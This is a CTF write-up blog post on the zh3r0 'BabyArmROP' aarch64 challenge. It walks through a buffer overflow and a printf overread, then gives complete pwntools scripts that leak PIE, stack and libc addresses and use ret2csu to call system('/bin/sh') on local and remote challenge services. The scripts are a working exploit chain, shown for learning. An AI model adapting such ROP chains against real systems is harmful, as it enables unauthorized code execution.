---
layout: post
author: playoff-rondo
title:  "zh3r0 CTF: BabyArmRop"
date:   2021-06-05 1:01:37 -0500
categories: CTF-writeup
ctf-category: PWN
---

# BabyArmROP (PWN)
aarch64 rop ret2csu

Note: My exploit was a little overboard because you didn't need to leak the stack. Using an address from the GOT is works for ret2csu.

## Description
Can u take baby steps with your arms?
flag location : /vuln/flag

## Initial Analysis
Tree of files provided:

![](https://i.imgur.com/TAhdADP.png)

The source code of the challenge was very short:
```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

void vuln() {
	char name_buffer[0x20];
	read(0, name_buffer, 0x1f);
	printf("Hello, %s\n; send me your message now: ", name_buffer);
	fflush(stdout);
	read(0, name_buffer, 0x200);
}

int main() {
	printf("Enter your name: ");
	fflush(stdout);
	vuln();
	return 0;
}

```
And the mitigations for the binary are:
```    
Arch:     aarch64-64-little
RELRO:    Partial RELRO
Stack:    No canary found
NX:       NX enabled
PIE:      PIE enabled
```

## Exploit Enviornment

Because this is an arm64 challenge, we will need to do some emulation to be able to run the binary on our x64 machine. The challenge provided a dockerfile to create a more accurate enviornment that also included qemu, which we will use for the emulation.

Before building the docker image, I needed to change a few things. Firstly, `run.sh` had an error. The runner tries to call the vuln binary with qemu in the `/chroot` directory, however the dockerfile shows that the directory that the vuln program is in is `/vuln`.

Second, to properally debug this challenge, I added `-strace -g 1234` as a qemu argument. This will run strace as well as spawn a gdbserver listening on port 1234. 

The updated `run.sh` now lookos like:
```bash
#!/usr/bin/env bash

socat tcp-listen:1337,fork,reuseaddr exec:"/vuln/qemu-aarch64 -L /vuln/ -strace -g 1234 -nx /vuln/vuln"
```

Then built the docker image with `docker build -t zh3r0_babyarm .`

Then use `docker run -p 1337:1337 -p 1234:1234 zh3r0_babyarm` to launch the container.

Now, when I connect to localhost port 1337, a gdbserver is started on port 1234. I use `gdb-multiarch ./vuln/vuln`  and then `target remote :1234` to connect to the gdb session.

![](https://i.imgur.com/I3IehIz.png)

GDB stops execution at the entry, however using gdb's `continue`, we can interact with the binary.

![](https://i.imgur.com/3CpzYvv.png)

We can script this interaction with:
```python
from pwn import *

io = remote("127.0.0.1",1337)

name = b"playoff-rondo"
message = b"gang gang"

io.sendlineafter(b"name: ",name)
io.sendlineafter(b"message now: ",message)

io.interactive()
```

I also decided to create a small gdbscript to call the `target remote` command as well as stepping through until we can determine the base address of the binary. This comes in handy because the binary is PIE so the base address will change every execution and we need to know the base address to be able to place breakpoints.

```
target remote :1234
ni 1750
si 27
p $x0-0x40
```

Running `gdb-multiarch -x gdb_script ./vuln/vuln` will connect and then print the binary base address:

![](https://i.imgur.com/3CsEhFY.png)



## Vulnerabilities

Now that we can interact with challenge and properly debug, its time to find some vulns.

### Buffer Overflow
The obvious vulnerability is the buffer overflow in the function aptly named `vuln`. We can read 0x200 bytes into an 0x20 byte buffer. 

To test this crash we can update the script to be:
```python
from pwn import *

io = remote("127.0.0.1",1337)

name = b"playoff-rondo"
message = b"A"*0x20
message += b"B"*8
message += b"C"*8

io.sendlineafter(b"name: ",name)
io.sendlineafter(b"message now: ",message)

io.interactive()
```

The result is a segfault trying to access `0x4343434343434343`

![](https://i.imgur.com/O2jRC0M.png)

Setting a breakpoint at the end of the `vuln` function will be helpful in stepping through to understand the crash.

The state of the stack at the time of the `ret` in the `vuln` function:

![](https://i.imgur.com/5N0YlyA.png)

In aarch64, when a `ret` is excuted, the `pc` does not become what is popped off the stack, the `pc` becomes whatever is in the `x30` register. 
Stepping to the next instrunction puts the flow of execution at the instruction after the `vuln` call:

![](https://i.imgur.com/1cgeaP0.png)

The `ldp x29, x30, [sp], #0x10` instruction does a "load pair" of the two words off the stack and then increases the stack pointer by 0x10.
The `0x4242424242424242` gets placed into the `x29` register and the `0x4343434343434343` gets placed into the `x30` register.
The next instruction is a ret, so the `pc` will set to what `x30` is, which means we can successfully control the `pc`.

### Buffer Overread
The is another vulnerability that is vital for the final exploit. 

The vulnerability appears with the following code:
```c
char name_buffer[0x20];
read(0, name_buffer, 0x1f);
printf("Hello, %s\n; send me your message now: ", name_buffer);
```
We can read 0x1f bytes into the `name_buffer` and then printf will print `name_buffer`.
The problem is printf's `%s` will print a the characters of a string until it reaches a null byte, but we can send a read in a name that does not contain a null byte but uses a "\n" (0xa) instead. This allows us to leak the bytes after our name until a null byte.

We can observe this behavior by breaking at the printf call and looking at the data at `x1`.

![](https://i.imgur.com/zpHc8yX.png)

Here we can see the name I sent was "playoff-rondo" and the character bytes of that string stop at the null byte after the newline character sent. 


## Exploitation

To exploit this binary and spawn a shell, I wil break it up into the 4 parts I used.

1. Leak PIE
2. Leak Stack address
3. Leak Libc
4. Call system("sh")

### Leak PIE
To be able to create a ropchain, the addresses of the ropgadgets need to be determined because of PIE.

Using the buffer overread vulnerability, and a payload of:
```python
from pwn import *

io = remote("127.0.0.1",1337)

name = b"A"
message = b"A"*0x20
message += b"B"*8
message += b"C"*8

io.sendlineafter(b"name: ",name)
io.sendlineafter(b"message now: ",message)

io.interactive()
```

And breaking at the printf call:

![](https://i.imgur.com/lJCMKvN.png)

If we fill up 8 bytes, the next bytes will be `0x000000000b2688a8` which is an adrress we can use to calculate PIE.

With a name of 8 characters, we can see the address get leaked. 

![](https://i.imgur.com/MstBCOy.png)

I then subtract the offset of the leak (2058) from the leak to calculate the PIE address:

```python
from pwn import *

io = remote("127.0.0.1",1337)

name = b"A"*8
message = b"A"*0x20
message += b"B"*8
message += b"C"*8

io.sendlineafter(b"name: ",name)
io.readuntil(name)
pie_leak = u64(io.readuntil("\n; send",drop=True).ljust(8,b"\x00")) - 2058
print("PIE: " + hex(pie_leak))
io.sendlineafter(b"message now: ",message)
```
![](https://i.imgur.com/rq8MHTr.png)

Reorganizing the poc will let us change the `0x4343434343434343` to the address of the vuln function so we can then abuse this leak again.

Script is now:
```python
from pwn import *
context.binary = elf = ELF("./vuln")

io = remote("127.0.0.1",1337)

name = b"A"*8
io.sendlineafter(b"name: ",name)
io.readuntil(name)
pie_leak = u64(io.readuntil("\n; send",drop=True).ljust(8,b"\x00")) - 2058
print("PIE: " + hex(pie_leak))
elf.address = pie_leak

message = b"A"*0x20
message += b"B"*8
message += p64(elf.symbols['vuln'])
io.sendlineafter(b"message now: ",message)

io.interactive()
```

And we can see that the binary now reads our name in again and we can get another leak.

![](https://i.imgur.com/0xhA4dY.png)

### Leak Stack

Now that we have PIE leaked we need to leak an address on the stack of which we can then control what the address is pointing to.

The following POC will send a second name so we can see what data we can leak.

```python
from pwn import *
context.binary = elf = ELF("./vuln")

io = remote("127.0.0.1",1337)

name = b"A"*8
io.sendlineafter(b"name: ",name)
io.readuntil(name)
pie_leak = u64(io.readuntil("\n; send",drop=True).ljust(8,b"\x00")) - 2058
print("PIE: " + hex(pie_leak))
elf.address = pie_leak

message = b"A"*0x20
message += b"B"*8
message += p64(elf.symbols['vuln'])
io.sendlineafter(b"message now: ",message)

io.clean()
second_name = b"A"
io.sendline(name)

io.interactive()
```

Inspecting `x1` at the time of the second printf call:

![](https://i.imgur.com/hawzp56.png)

Unfortunetly, a libc address does not appear until 0x68 bytes from our string and the read we have can only read 0x1f bytes.

Instead of ropping to the start of `vuln` we can rop to `vuln+0x18` (the `bl read`). 

![](https://i.imgur.com/xRrtZc7.png)

This will call read with the arguments already in `x0`, `x1` and `x2`, which luckly are the following at the time we control `pc`.

![](https://i.imgur.com/PaLYXLJ.png)

So now we can read 0x200 bytes

Send 0x77 characters so the next bytes are the stack address.

```python
from pwn import *
context.binary = elf = ELF("./vuln")

io = remote("127.0.0.1",1337)

name = b"A"*8
io.sendlineafter(b"name: ",name)
io.readuntil(name)
pie_leak = u64(io.readuntil("\n; send",drop=True).ljust(8,b"\x00")) - 2058
print("PIE: " + hex(pie_leak))
elf.address = pie_leak

message = b"A"*0x20
message += b"B"*8
message += p64(elf.symbols['vuln']+0x18)
io.sendlineafter(b"message now: ",message)

io.clean()
second_name = b"A"*0x77
io.sendline(second_name)

io.interactive()
```
![](https://i.imgur.com/oG1HJaw.png)

Unfortunately, a long name will be apart of a buffer overflow which is why the binary crashes, luckly we still control what `pc` will be.

We can rop to the address directly after the read call to continue execution and print our leak. That address is `vuln+0x1c`

```python
second_name  = b"A"*8 #x29
second_name += p64(elf.symbols['vuln']+0x1c) #x30
second_name += b"A"*32 # junk
second_name += b"A"*8 #x29
second_name += p64(elf.symbols['main']) #x30
second_name += b"A"*0x37 # more junk to bring size to 0x77
io.sendline(second_name)
io.readline()
stack_leak = u64(io.readline().strip().ljust(8,b"\x00")) - 280
print("Stack Leak: " + hex(stack_leak))

io.interactive()
```

I subtracted 280 from the leak because that is the address of the beginning of the input.

Also have the binary rop to main after the leak is done.

![](https://i.imgur.com/BDzZFkJ.png)


### Leak Libc

To leak libc, the goal is to call `printf(printf_got)`, however there were no good gadgets to control `x0` to set it to `printf` entry on the GOT.

Enter ret2csu.

More information about ret2csu can be found [here](https://bananamafia.dev/post/x64-rop-redpwn/)

ret2csu consists of 2 gadgets:
* csu_popper (__libc_csu_init+104)

![](https://i.imgur.com/sKSwwwd.png)

* csu_caller (__libc_csu_init+72)

![](https://i.imgur.com/OcxxOex.png)

The popper gadget lets us control the following registers:
* x19
* x20
* x21
* x22
* x23
* x24
* x29
* x30

And the caller gadget sets registers:
* w0 from w22 (w0 is a 32bit subregister of x0, same for w22)
* x1 from x23
* x2 from x24

The caller gadget also will call what `x21 + (x19*8)` is pointing to.

The hard part of ret2csu is finding a memory address that when derefernced points to the function you want to call. 

Luckily, because we have a stack leak, we can place a function pointer on the in our input and set `x21` to be the stack address of our function pointer and `x19` to be `0` because we just want the address in `x21`

```python
csu_popper = elf.symbols['__libc_csu_init']+104
csu_caller = elf.symbols['__libc_csu_init']+72

leak_libc_payload = b""
leak_libc_payload += b"B"*0x47
leak_libc_payload += p64(csu_popper)
leak_libc_payload += p64(elf.symbols['printf']) # x29 #stack_leak points to this
leak_libc_payload += p64(csu_caller) # x30
leak_libc_payload += p64(0) # x19 needs to be 0
leak_libc_payload += p64(0) # x20 junk
leak_libc_payload += p64(stack_leak) # x21 call*
leak_libc_payload += p64(elf.got['printf'])# x22 x0
leak_libc_payload += b"XXXXXXXX" # x23 x1
leak_libc_payload += p64(0) # x24 x2

io.sendline(leak_libc_payload)
```

Running this has the following: 

![](https://i.imgur.com/1yrVeYk.png)

For some reason, `x23` ends up becoming `pc` so setting `x32` to `p64(elf.symbols['vuln']+0x30)` (call to flush) will flush stdout and print the leak.

Full code up to this point:
```python
from pwn import *
context.binary = elf = ELF("./vuln")
libc = ELF("./lib/libc.so.6")

io = remote("127.0.0.1",1337)

name = b"A"*8
io.sendlineafter(b"name: ",name)
io.readuntil(name)
pie_leak = u64(io.readuntil("\n; send",drop=True).ljust(8,b"\x00")) - 2058
print("PIE: " + hex(pie_leak))
elf.address = pie_leak

message  = b"A"*0x20
message += b"B"*8
message += p64(elf.symbols['vuln']+0x18)
io.sendlineafter(b"message now: ",message)

io.clean()

second_name  = b"A"*8 #x29
second_name += p64(elf.symbols['vuln']+0x1c) #x30
second_name += b"A"*32 # junk
second_name += b"A"*8 #x29
second_name += p64(elf.symbols['main']) #x30
second_name += b"A"*0x37 # more junk to bring size to 0x77
io.sendline(second_name)
io.readline()
stack_leak = u64(io.readline().strip().ljust(8,b"\x00")) - 280
print("Stack Leak: " + hex(stack_leak))

io.sendline("Rondo") #name

csu_popper = elf.symbols['__libc_csu_init']+104
csu_caller = elf.symbols['__libc_csu_init']+72

leak_libc_payload = b""
leak_libc_payload += b"B"*0x47
leak_libc_payload += p64(csu_popper)
leak_libc_payload += p64(elf.symbols['printf']) # x29 #stack_leak points to this
leak_libc_payload += p64(csu_caller) # x30
leak_libc_payload += p64(0) # x19 needs to be 0
leak_libc_payload += p64(0) # x20 junk
leak_libc_payload += p64(stack_leak) # x21 call*
leak_libc_payload += p64(elf.got['printf'])# x22 x0
leak_libc_payload += p64(elf.symbols['vuln']+0x30) # x23 x1
leak_libc_payload += p64(0) # x24 x2

io.sendline(leak_libc_payload)

io.readuntil("now: ")
io.readuntil("now: ")

libc.address =  u64(io.read(4).strip().ljust(8,b"\x00")) - libc.symbols['printf']
print("libc: " + hex(libc.address))

io.interactive()
```

And result:

![](https://i.imgur.com/Ge6WNsy.png)

## Get Shell

Now with a libc leak we can call any gadgets within libc. Unfortunetly `one_gadget` lets us down again and manually looking through the provided libc was unable to find any one shot gadgets.

Using the same ret2csu method, we can call `system("/bin/sh")`

However in this case, the leaked stack address may not align correctly so I spam my input with a ton of function pointers to libc system so hopefully the leaked stack pointer falls in that sled.

```python
call_system  = b""
call_system += b"A"*0x47 #junk
call_system += p64(csu_popper)
call_system += b"RONDO___" # x29
call_system += p64(csu_caller) #x30
call_system += p64(0) #x19
call_system += p64(0) #x20
call_system += p64(stack_leak) #x21 call*
call_system += p64(next(libc.search(b"/bin/sh")))# x22 x0
call_system += p64(0) # x23 x1
call_system += p64(0) # x24 x2
call_system += p64(libc.symbols['system'])*0x20

io.clean()
io.sendline(call_system)
```

And the result:

![](https://i.imgur.com/cEiZ9JH.png)


# Local Exploit

The full local exploit:

```python
from pwn import *
context.binary = elf = ELF("./vuln")
libc = ELF("./lib/libc.so.6")

io = remote("127.0.0.1",1337)

name = b"A"*8
io.sendlineafter(b"name: ",name)
io.readuntil(name)
pie_leak = u64(io.readuntil("\n; send",drop=True).ljust(8,b"\x00")) - 2058
print("PIE: " + hex(pie_leak))
elf.address = pie_leak

message  = b"A"*0x20
message += b"B"*8
message += p64(elf.symbols['vuln']+0x18)
io.sendlineafter(b"message now: ",message)

io.clean()

second_name  = b"A"*8 #x29
second_name += p64(elf.symbols['vuln']+0x1c) #x30
second_name += b"A"*32 # junk
second_name += b"A"*8 #x29
second_name += p64(elf.symbols['main']) #x30
second_name += b"A"*0x37 # more junk to bring size to 0x77
io.sendline(second_name)
io.readline()
stack_leak = u64(io.readline().strip().ljust(8,b"\x00")) - 280
print("Stack Leak: " + hex(stack_leak))

io.sendline("Rondo") #name

csu_popper = elf.symbols['__libc_csu_init']+104
csu_caller = elf.symbols['__libc_csu_init']+72

leak_libc_payload = b""
leak_libc_payload += b"B"*0x47
leak_libc_payload += p64(csu_popper)
leak_libc_payload += p64(elf.symbols['printf']) # x29 #stack_leak points to this
leak_libc_payload += p64(csu_caller) # x30
leak_libc_payload += p64(0) # x19 needs to be 0
leak_libc_payload += p64(0) # x20 junk
leak_libc_payload += p64(stack_leak) # x21 call*
leak_libc_payload += p64(elf.got['printf'])# x22 x0
leak_libc_payload += p64(elf.symbols['vuln']+0x30) # x23 x1
leak_libc_payload += p64(0) # x24 x2

io.sendline(leak_libc_payload)

io.readuntil("now: ")
io.readuntil("now: ")

libc.address =  u64(io.read(4).strip().ljust(8,b"\x00")) - libc.symbols['printf']
print("libc: " + hex(libc.address))

io.sendline(b"playoff") # message from earlier call
io.sendline(b"rondo") # name for new call

call_system  = b""
call_system += b"A"*0x47 #junk
call_system += p64(csu_popper)
call_system += b"RONDO___" # x29
call_system += p64(csu_caller) #x30
call_system += p64(0) #x19
call_system += p64(0) #x20
call_system += p64(stack_leak) #x21 call*
call_system += p64(next(libc.search(b"/bin/sh")))# x22 x0
call_system += p64(0) # x23 x1
call_system += p64(0) # x24 x2
call_system += p64(libc.symbols['system'])*0x200

io.clean()
io.sendline(call_system)

io.interactive()
```

# Remote Exploit

I was having difficulties getting a shell on the remote even though the local exploit works fine with the provided docker image.
I knew my leaks were correct otherwise the libc leak would not end so perfectly with `000`. This lead me to assume only the last stage of my exploit was failing.

Turns out the amount of padding for the `call_system` payload was not 0x47.

I brute forced that value buy changing the size of the padding and then ropping back to main and testing on the remote service.
With a padding of 0x41, my exploit successfully ropped back to main. 

Final remote exploit:
```python
from pwn import *
context.binary = elf = ELF("./vuln")
libc = ELF("./lib/libc.so.6")

io = remote("pwn.zh3r0.cf", 1111)

name = b"A"*8
io.sendlineafter(b"name: ",name)
io.readuntil(name)
pie_leak = u64(io.readuntil("\n; send",drop=True).ljust(8,b"\x00")) - 2058
print("PIE: " + hex(pie_leak))
elf.address = pie_leak

message  = b"A"*0x20
message += b"B"*8
message += p64(elf.symbols['vuln']+0x18)
io.sendlineafter(b"message now: ",message)

io.clean()

second_name  = b"A"*8 #x29
second_name += p64(elf.symbols['vuln']+0x1c) #x30
second_name += b"A"*32 # junk
second_name += b"A"*8 #x29
second_name += p64(elf.symbols['main']) #x30
second_name += b"A"*0x37 # more junk to bring size to 0x77
io.sendline(second_name)
io.readline()
stack_leak = u64(io.readline().strip().ljust(8,b"\x00")) - 280
print("Stack Leak: " + hex(stack_leak))

io.sendline("Rondo") #name

csu_popper = elf.symbols['__libc_csu_init']+104
csu_caller = elf.symbols['__libc_csu_init']+72

leak_libc_payload = b""
leak_libc_payload += b"B"*0x47
leak_libc_payload += p64(csu_popper)
leak_libc_payload += p64(elf.symbols['printf']) # x29 #stack_leak points to this
leak_libc_payload += p64(csu_caller) # x30
leak_libc_payload += p64(0) # x19 needs to be 0
leak_libc_payload += p64(0) # x20 junk
leak_libc_payload += p64(stack_leak) # x21 call*
leak_libc_payload += p64(elf.got['printf'])# x22 x0
leak_libc_payload += p64(elf.symbols['vuln']+0x30) # x23 x1
leak_libc_payload += p64(0) # x24 x2

io.sendline(leak_libc_payload)

io.readuntil("now: ")
io.readuntil("now: ")

libc.address =  u64(io.read(4).strip().ljust(8,b"\x00")) - libc.symbols['printf']
print("libc: " + hex(libc.address))

io.sendline(b"playoff") # message from earlier call
io.sendline(b"rondo") # name for new call

call_system  = b""
call_system += b"A"*0x41 #junk
call_system += p64(csu_popper)
call_system += b"RONDO___" # x29
call_system += p64(csu_caller) #x30
call_system += p64(0) #x19
call_system += p64(0) #x20
call_system += p64(stack_leak) #x21 call*
call_system += p64(next(libc.search(b"/bin/sh")))# x22 x0
call_system += p64(0) # x23 x1
call_system += p64(0) # x24 x2
call_system += p64(libc.symbols['system'])*0x200

io.clean()
io.sendline(call_system)

io.interactive()
```

And I get the flag:

![](https://i.imgur.com/IUiuhrf.png)






